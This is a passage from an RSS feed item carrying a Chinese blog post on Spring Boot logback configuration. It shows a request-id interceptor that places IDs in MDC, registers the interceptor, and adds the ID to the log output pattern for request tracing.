&lt;li&gt;请求结束后，清除此&lt;code&gt;request-id&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;添加拦截器&quot;&gt;5.1 添加拦截器&lt;/h2&gt;
&lt;h3 id=&quot;拦截器实现&quot;&gt;5.1.1 拦截器实现&lt;/h3&gt;
&lt;p&gt;通过拦截器，实现在请求前添加&lt;code&gt;request-id&lt;/code&gt;，并放到 MDC 中；请求完成后清除的动作。添加包 &lt;code&gt;interceptor&lt;/code&gt; 存放拦截器类，类定义如下：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Slf4j
@Component
public class RequestIdTraceInterceptor implements HandlerInterceptor {

    public static final String REQUEST_ID_KEY = &quot;request-id&quot;;

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) {
        MDC.put(REQUEST_ID_KEY, getRequestId(request));
        return true;
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) {
        //把requestId添加到响应头，以便其它应用使用
        response.addHeader(REQUEST_ID_KEY, MDC.get(REQUEST_ID_KEY));
        //请求完成，从MDC中移除requestId
        MDC.remove(REQUEST_ID_KEY);
    }
    
    public static String getRequestId(HttpServletRequest request) {...// 后面给出}
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;此拦截器主要覆盖 &lt;code&gt;preHandle&lt;/code&gt; 及 &lt;code&gt;afterCompletion&lt;/code&gt; 方法，分别请求前和请求完成后的处理。使用 &lt;code&gt;MDC.put()&lt;/code&gt; 及 &lt;code&gt;MDC.remove()&lt;/code&gt; 实现对MDC的写入及清除操作。&lt;/p&gt;
&lt;p&gt;在获取 &lt;code&gt;request-id&lt;/code&gt; 时，使用方法是 &lt;code&gt;getRequestId()&lt;/code&gt;，如下所示：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public static String getRequestId(HttpServletRequest request) {
    String requestId;
    String parameterRequestId = request.getParameter(REQUEST_ID_KEY);
    String headerRequestId = request.getHeader(REQUEST_ID_KEY);
    // 根据请求参数或请求头判断是否有“request-id”，有则使用，无则创建
    if (parameterRequestId == null &amp;amp;&amp;amp; headerRequestId == null) {
        log.debug(&quot;no request-id in request parameter or header&quot;);
        requestId = IdUtil.simpleUUID();
    } else {
        requestId = parameterRequestId != null ? parameterRequestId : headerRequestId;
    }

    return requestId;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;根据请求参数或请求头判断是否有“request-id”，有则使用，无则创建，创建的&lt;code&gt;request-id&lt;/code&gt; 为simpleUUID，以此作为唯一标识。&lt;/p&gt;
&lt;h3 id=&quot;注册拦截器到web配置中&quot;&gt;5.1.2 注册拦截器到web配置中&lt;/h3&gt;
&lt;p&gt;添加 &lt;code&gt;config&lt;/code&gt; 包用于存放配置文件。继承 &lt;code&gt;WebMvcConfigurer&lt;/code&gt; 实现 &lt;code&gt;addInterceptors&lt;/code&gt; 来添加拦截器到 web 配置中：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Configuration
public class WebAppConfig implements WebMvcConfigurer {
    @Autowired
    RequestIdTraceInterceptor requestIdTraceInterceptor;

    /**
     * 添加拦截器
     * @param registry
     */
    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        //添加requestId
        registry.addInterceptor(requestIdTraceInterceptor);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;设置-mdc-日志输出&quot;&gt;5.2 设置 MDC 日志输出&lt;/h2&gt;
&lt;p&gt;logback 的 MDC 输出是用&lt;code&gt;%X{key}&lt;/code&gt; 来作标识符进行输出，因此，修改 &lt;code&gt;logback-spring.xml&lt;/code&gt; 文件，在输出格式中添加 &lt;code&gt;%X{request-id}&lt;/code&gt; 输出，如下：&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;property name=&quot;log.pattern&quot;
              value=&quot;%d{yyyy-MM-dd HH:mm:ss.SSS} %5level [%10thread] [%X{request-id}] %40.40logger{40} [%10method,%line] : %msg%n&quot;/&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;至此，MDC处理完毕，启动应用，访问其中的某一个接口，输出如下（其中&lt;code&gt;8e955ff61fa7494788f52891a4fdbc6a&lt;/code&gt;即可 &lt;code&gt;request-id&lt;/code&gt;）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/mianshenglee/datastorage/raw/master/md-photo/logback/logback-MDC-data.png&quot; alt=&quot;MDC日志输出&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;注意，示例代码没有给出调用其它服务时的处理，当调用时，从 MDC 中获取 &lt;code&gt;request-id&lt;/code&gt; ，然后把它作为 header参数，实现 &lt;code&gt;request-id&lt;/code&gt; 的传递。这样查询日志时，根据此id来追踪就可以了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;本篇文章针对springboot应用开发中，如何更好的使用 logback 解决日志输出的相关问题，主要包括 loback 状态数据的输出，使用异步解决日志输出性能问题，配置多环境下的日志输出以及使用MDC解决分布式应用追踪请求。希望能对大家有帮助。&lt;/p&gt;
&lt;p&gt;本文中使用的示例代码已放在&lt;a href=&quot;https://github.com/mianshenglee/my-example/tree/master/springboot-logback-demo/logback-advance-demo&quot;&gt;我的github&lt;/a&gt;：&lt;code&gt;https://github.com/mianshenglee/my-example/tree/master/springboot-logback-demo&lt;/code&gt;，有兴趣的同学可以pull代码，结合示例一起学习。&lt;/p&gt;


&lt;p&gt;关注我的公众号（搜索&lt;code&gt;Mason技术记录&lt;/code&gt;），获取更多技术记录：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/mianshenglee/datastorage/raw/master/md-photo/myphoto/wx/wx-public.jpg&quot; alt=&quot;mason&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 29 Nov 2019 13:08:00 +0000</pubDate>
<dc:creator>Mason技术记录</dc:creator>
<og:description>logback 在实现了基本的日志输出到文件功能后，在企业实践中，还会有其它的进阶需求，本文对logback的进阶使用进行描述。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/masonlee/p/11960300.html</dc:identifier>
</item>
</channel>
</rss>